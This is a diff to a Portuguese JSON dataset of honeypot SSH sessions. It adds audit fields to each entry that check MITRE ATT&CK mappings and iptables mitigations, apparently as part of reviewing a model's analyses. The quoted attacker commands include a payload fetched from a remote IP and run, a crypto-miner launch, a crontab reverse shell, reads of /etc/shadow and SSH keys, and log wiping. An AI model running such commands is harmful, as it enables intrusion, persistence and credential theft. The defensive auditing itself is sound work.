@@ -33,6 +33,16 @@
       "comandos": [
         "uname -s -v -n -r -m"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -69,6 +79,16 @@
       "comandos": [
         "uname -s -v -n -r -m"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -105,6 +125,16 @@
       "comandos": [
         "uname -s -v -n -r -m"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -141,6 +171,16 @@
       "comandos": [
         "echo xsec"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "PARCIAL",
+      "justificativa": "O comando echo xsec apenas imprime uma string de verificacao pos-login no shell (T1059.004), nao configurando varredura ativa de rede pre-comprometimento (T1595)."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -177,6 +217,16 @@
       "comandos": [
         "echo xsec"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "PARCIAL",
+      "justificativa": "Criterio uniforme para echo xsec: o comando apenas imprime uma string de teste no shell (T1059.004), nao coletando informacoes do host na fase de reconhecimento (T1592)."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -227,6 +277,16 @@
         "chmod +x bot.sh",
         "./bot.sh"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -274,6 +334,16 @@
         "curl -O http://185.220.101.42/bins.sh",
         "sh bins.sh"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -310,6 +380,16 @@
       "comandos": [
         "cat /proc/cpuinfo"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -346,6 +426,16 @@
       "comandos": [
         "uname -a"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -382,6 +472,16 @@
       "comandos": [
         "uname -s -v -n -r -m"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -418,6 +518,16 @@
       "comandos": [
         "uname -s -v -n -r -m"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -454,6 +564,16 @@
       "comandos": [
         "echo xsec"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "PARCIAL",
+      "justificativa": "Criterio uniforme para echo xsec: o comando imprime string fixa de verificacao (T1059.004) sem consultar dados do sistema operacional (T1082)."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -490,6 +610,16 @@
       "comandos": [
         "uname -s -v -n -r -m"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -526,6 +656,16 @@
       "comandos": [
         "cat /proc/cpuinfo"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -562,6 +702,16 @@
       "comandos": [
         "uname -s -v -n -r -m"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -598,6 +748,16 @@
       "comandos": [
         "uname -a"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -634,6 +794,16 @@
       "comandos": [
         "uname -s -v -n -r -m"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -684,6 +854,16 @@
         "chmod +x xmrig",
         "./xmrig"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -720,6 +900,16 @@
       "comandos": [
         "uname -s -v -n -r -m"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -786,6 +976,16 @@
         "cat /proc/cpuinfo",
         "crontab -l"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -832,6 +1032,16 @@
         "cd usr/",
         "exit"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -872,6 +1082,16 @@
         "cd .bashrc",
         "ipconfig"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -956,6 +1176,16 @@
         "history -c",
         "exit"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -1030,6 +1260,16 @@
         "rm -f /tmp/backup_dump.tar.gz && history -c",
         "exit"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": false,
+      "observacao": "Ressalva nos comandos secundarios: sugere flag inexistente (passwd -a) e destruicao de artefato de evidencia (shred -u /tmp/backup_dump.tar.gz)."
     }
   },
   {
@@ -1111,6 +1351,16 @@
         "echo '*/10 * * * * /bin/bash -c \"bash -i >& /dev/tcp/203.0.113.55/4443 0>&1\"' >> /etc/crontab",
         "unset HISTFILE && exit"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": false,
+      "observacao": "Ressalva nos comandos secundarios: sugere sobrescrever chave SSH (rm -f ~/.ssh/id_rsa && ssh-keygen) e nao inclui bloqueio de saida para o IP C2 203.0.113.55 no iptables."
     }
   },
   {
@@ -1187,6 +1437,16 @@
         "cat ~/.ssh/id_rsa",
         "netstat -tulpn"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "PARCIAL",
+      "justificativa": "O modelo mapeou find / -perm -4000 diretamente para abuso de SUID (T1548.001) pela intencao final, mas a acao executada no log e descoberta de arquivos (T1083)."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": false,
+      "observacao": "Ressalva nos comandos secundarios: sugere bloqueio de usuario derivado apenas do login da sessao (passwd -l admin_ti) e remocao destrutiva de chave (rm -f ~/.ssh/id_rsa)."
     }
   },
   {
@@ -1250,6 +1510,16 @@
         "cat /var/log/auth.log | tail -n 20",
         "history -c && rm -f ~/.bash_history"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "PARCIAL",
+      "justificativa": "O modelo mapeou sudo -l diretamente para abuso de elevacao de privilegio (T1548), embora o comando apenas liste permissoes sudo disponiveis."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": false,
+      "observacao": "Ressalva nos comandos secundarios: sugere bloqueio de conta derivada da sessao (passwd -l sysadmin) e comando destrutivo (killall -u backdoor)."
     }
   },
   {
@@ -1316,6 +1586,16 @@
         "find /etc -writable 2>/dev/null",
         "history -c"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -1362,6 +1642,16 @@
         "cat /etc/shadow",
         "history -c"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": true,
+      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
     }
   },
   {
@@ -1428,6 +1718,16 @@
         "useradd -m -s /bin/bash suporte",
         "history -c && exit"
       ]
+    },
+    "conferencia_mitre": {
+      "status": "EXATO",
+      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+    },
+    "auditoria_mitigacao": {
+      "iptables_sintaxe_valida": true,
+      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "comandos_secundarios_sem_ressalva": false,
+      "observacao": "Ressalva nos comandos secundarios: sugere remocao imediata de diretorio home (userdel -r suporte) sem preservacao pericial previa."
     }
   }
 ]
